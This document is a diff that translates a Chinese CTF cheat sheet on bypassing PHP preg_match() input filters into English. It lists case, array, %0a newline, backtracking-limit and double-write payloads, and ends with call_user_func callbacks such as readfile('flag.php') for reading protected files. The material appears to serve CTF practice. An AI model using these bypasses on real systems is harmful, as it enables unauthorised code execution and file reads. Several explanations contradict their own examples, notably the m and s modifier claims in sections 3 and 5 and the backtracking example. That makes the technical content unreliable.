@@ -1,113 +1,113 @@
-# PHP 正则绕过速查
+# PHP Regex Bypass Quick Reference
 
-## 核心原理
+## Core Principles
 
-PHP 的 `preg_match()` 函数在过滤用户输入时，常因正则表达式设计不当而被绕过。
-理解正则修饰符和 PHP 类型行为是绕过的关键。
+When PHP's `preg_match()` function filters user input, it is often bypassed due to poorly designed regular expressions.
+Understanding regex modifiers and PHP type behavior is key to the bypass.
 
-## 1. 大小写绕过
+## 1. Case Bypass
 
-**适用条件**: 正则没有 `i`（PCRE_CASELESS）修饰符
+**Applicable condition**: The regex lacks the `i` (PCRE_CASELESS) modifier
 
 ```php
-// 被过滤的正则 — 无 i 修饰符
-preg_match("/n|c/m", $_GET['p']);  // 只匹配小写 n 和 c
+// Filtered regex — no i modifier
+preg_match("/n|c/m", $_GET['p']);  // Only matches lowercase n and c
 
-// 绕过方式 — 用大写字母
-// nss2 含有 n → 被拦截
-// Nss2 含有 N → 不匹配小写 n → 绕过成功！
-// Ctf 含有 C → 不匹配小写 c → 绕过成功！
+// Bypass method — use uppercase letters
+// nss2 contains n → blocked
+// Nss2 contains N → does not match lowercase n → bypass succeeds!
+// Ctf contains C → does not match lowercase c → bypass succeeds!
 
-// PHP 类名和函数名大小写不敏感
-call_user_func('Nss2::Ctf');  // 等价于 nss2::ctf()
+// PHP class names and function names are case-insensitive
+call_user_func('Nss2::Ctf');  // Equivalent to nss2::ctf()
 ```
 
-**验证方法**: 先确认正则是否带 `i` 修饰符，再决定使用大小写绕过
+**Verification method**: First confirm whether the regex has the `i` modifier, then decide whether to use a case bypass
 
-## 2. 数组绕过
+## 2. Array Bypass
 
-**适用条件**: 函数只接受字符串参数，传入数组会返回 false
+**Applicable condition**: The function only accepts a string argument; passing an array returns false
 
 ```php
-// preg_match() 第二个参数需要字符串
-// 传入数组 → 返回 false + Warning → 绕过正则检查
+// preg_match()'s second argument requires a string
+// Passing an array → returns false + Warning → bypasses the regex check
 
 // URL: ?p[]=nss2&p[]=ctf
-// $_GET['p'] = ['nss2', 'ctf']  (数组而非字符串)
-// preg_match("/n|c/m", ['nss2', 'ctf']) → false → 绕过！
+// $_GET['p'] = ['nss2', 'ctf']  (array rather than string)
+// preg_match("/n|c/m", ['nss2', 'ctf']) → false → bypass!
 
-// call_user_func 接受数组作为回调
-call_user_func(['nss2', 'ctf']);  // 等价于 nss2::ctf()
+// call_user_func accepts an array as a callback
+call_user_func(['nss2', 'ctf']);  // Equivalent to nss2::ctf()
 ```
 
-## 3. 换行符绕过
+## 3. Newline Bypass
 
-**适用条件**: 正则使用 `^...$` 锚点 + `m` 修饰符
+**Applicable condition**: The regex uses `^...$` anchors + the `m` modifier
 
 ```php
-// 常见误解：m 修饰符不会让 /n/ 匹配换行符
-// m 修饰符只影响 ^ 和 $ 的匹配行为（多行模式）
+// Common misconception: the m modifier does not make /n/ match a newline
+// The m modifier only affects the matching behavior of ^ and $ (multiline mode)
 
-// 可以绕过的情况：
-preg_match("/^flag$/", $input);  // m 修饰符下可用 %0aflag 绕过
+// Bypassable case:
+preg_match("/^flag$/", $input);  // Under the m modifier, %0aflag can be used to bypass
 
-// 不能绕过的情况：
-preg_match("/n|c/m", $input);    // m 不影响 n 和 c 的匹配
+// Non-bypassable case:
+preg_match("/n|c/m", $input);    // m does not affect matching of n and c
 ```
 
-## 4. PCRE 回溯限制绕过
+## 4. PCRE Backtracking Limit Bypass
 
-**适用条件**: 超长字符串 + 回溯量大的正则
+**Applicable condition**: An extremely long string + a regex with heavy backtracking
 
 ```php
-// preg_match 默认回溯上限 1000000
-// 超过则返回 false（不是 0 或 1）
+// preg_match's default backtracking limit is 1000000
+// Exceeding it returns false (not 0 or 1)
 
-// 构造超长字符串触发回溯限制
+// Construct an extremely long string to trigger the backtracking limit
 $str = str_repeat('a', 1000000);
-preg_match("/.*$/", $str);  // 返回 false → 绕过
+preg_match("/.*$/", $str);  // Returns false → bypass
 ```
 
-## 5. `%0a` 换行注入
+## 5. `%0a` Newline Injection
 
-**适用条件**: 正则使用 `^...$` 但没有 `s`（DOTALL）修饰符
+**Applicable condition**: The regex uses `^...$` but lacks the `s` (DOTALL) modifier
 
 ```php
-// 绕过 ^...$ 锚点
-// 输入: "good\nmalicious"
-preg_match("/^good$/", "good\nmalicious");  // 无 m 时不匹配
-preg_match("/^good$/m", "good\nmalicious");  // 有 m 时匹配第一行
+// Bypass the ^...$ anchors
+// Input: "good\nmalicious"
+preg_match("/^good$/", "good\nmalicious");  // Does not match without m
+preg_match("/^good$/m", "good\nmalicious");  // Matches the first line with m
 ```
 
-## 常见 CTF 题型模式
+## Common CTF Challenge Patterns
 
-| 类型 | 正则示例 | 绕过方式 |
+| Type | Regex Example | Bypass Method |
 |------|----------|----------|
-| 大小写过滤 | `/n\|c/m` | `Nss2::Ctf`（大小写绕过） |
-| 字符串函数过滤 | `/system\|exec/` | `p[]=class&p[]=method`（数组绕过） |
-| 锚点匹配 | `/^flag$/` | `flag%0a` 或 `%0aflag`（换行绕过） |
-| 回溯限制 | `/.*/` | 超长字符串触发 PCRE 回溯限制 |
-| 无锚点 | `/flag/` | `flflagag`（双写绕过，如做了 str_replace） |
+| Case filter | `/n\|c/m` | `Nss2::Ctf` (case bypass) |
+| String function filter | `/system\|exec/` | `p[]=class&p[]=method` (array bypass) |
+| Anchor matching | `/^flag$/` | `flag%0a` or `%0aflag` (newline bypass) |
+| Backtracking limit | `/.*/` | Extremely long string triggers PCRE backtracking limit |
+| No anchors | `/flag/` | `flflagag` (double-write bypass, if str_replace is used) |
 
-## call_user_func 回调方式速查
+## call_user_func Callback Quick Reference
 
 ```php
-// 调用普通函数
+// Call a regular function
 call_user_func('readfile', 'flag.php');
 
-// 调用静态方法（字符串形式）
-call_user_func('Nss2::Ctf');  // 大小写绕过后
+// Call a static method (string form)
+call_user_func('Nss2::Ctf');  // After case bypass
 
-// 调用静态方法（数组形式）
-call_user_func(['Nss2', 'Ctf']);  // 数组绕过后
+// Call a static method (array form)
+call_user_func(['Nss2', 'Ctf']);  // After array bypass
 
-// 调用实例方法
+// Call an instance method
 call_user_func([$obj, 'method']);
 ```
 
-## ⚠️ 常见错误
+## ⚠️ Common Mistakes
 
-1. **`call_user_func('readfile')` 不带参数** — 不会读取任何文件，必须传 `call_user_func('readfile', 'flag.php')`
-2. **混淆 `m` 和 `i` 修饰符** — `m` 是多行模式，`i` 才是忽略大小写
-3. **忽略 PHP 类型杂耍** — `preg_match` 遇到数组返回 `false`，不是 `0`
-4. **猜测 flag 内容** — 必须通过工具获取真实响应，不能编造
+1. **`call_user_func('readfile')` without an argument** — will not read any file; you must pass `call_user_func('readfile', 'flag.php')`
+2. **Confusing the `m` and `i` modifiers** — `m` is multiline mode; `i` is the one that ignores case
+3. **Ignoring PHP type juggling** — `preg_match` returns `false`, not `0`, when given an array
+4. **Guessing the flag content** — you must obtain the real response through tools; do not fabricate it
